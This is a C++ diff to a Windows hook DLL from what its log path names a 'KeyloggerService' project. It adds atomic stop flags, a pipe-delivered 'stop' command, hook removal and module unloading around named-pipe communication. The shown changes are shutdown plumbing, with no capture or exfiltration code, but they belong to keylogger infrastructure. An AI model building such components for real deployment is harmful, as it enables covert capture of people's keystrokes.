@@ -13,8 +13,11 @@ HANDLE hThread;
 HANDLE hookThread;
 HHOOK g_hHook;
 HANDLE writePipe;
+HANDLE hPipe;
+HMODULE gModule;
 
-bool stopFlag = false;
+std::atomic<bool> stopFlag(false);
+std::atomic<bool> stopCallback(false);
 
 void printToLog(std::string data, std::string filename = "!HookDll.log") {
     std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\" + filename, std::ios_base::app);
@@ -26,13 +29,16 @@ void printToLog(std::string data, std::string filename = "!HookDll.log") {
 void Stop()
 {
     stopFlag = true;
+    CancelIo(hPipe);
+    if (g_hHook)UnhookWindowsHookEx(g_hHook);
+    SetEvent(hEvent);
+    FreeLibrary(gModule);
 }
 
 DWORD WINAPI readCommandThread(LPVOID lpThreadParameter)
 {
     std::wstring name = L"\\\\.\\pipe\\myreadpipe";
     SECURITY_ATTRIBUTES sa;
-    HANDLE hPipe;
     DWORD dwRead = 1;
     DWORD error;
     COMMTIMEOUTS timeouts;
@@ -72,13 +78,17 @@ DWORD WINAPI readCommandThread(LPVOID lpThreadParameter)
 
             dwRead = 1;
             error = ERROR_SUCCESS;
-            while (error != ERROR_BROKEN_PIPE)
+            while (error != ERROR_BROKEN_PIPE && !stopFlag)
             {
                 startFlag = true;
                 dwRead = 0;
 
-                KeyInfo data;
+                char data[50];
                 ReadFile(hPipe, &data, sizeof(data), &dwRead, NULL);
+
+                if (std::string(data).find("stop") != std::string::npos) {
+                    goto _exit;
+                }
                 if (dwRead == 0)break;
                 error = GetLastError();
             }
@@ -93,8 +103,9 @@ DWORD WINAPI readCommandThread(LPVOID lpThreadParameter)
 
     CloseHandle(hPipe);
     ret = EXIT_SUCCESS;
-
 _exit:
+    stopCallback = true;
+    Stop();
     return ret;
 }
 
@@ -177,7 +188,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
     case DLL_PROCESS_ATTACH:
         // Создаем событие
         hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
-
+        gModule = hModule;
         if (!writePipe) {
             writePipe = CreateFile(
                 L"\\\\.\\pipe\\mywritepipe",
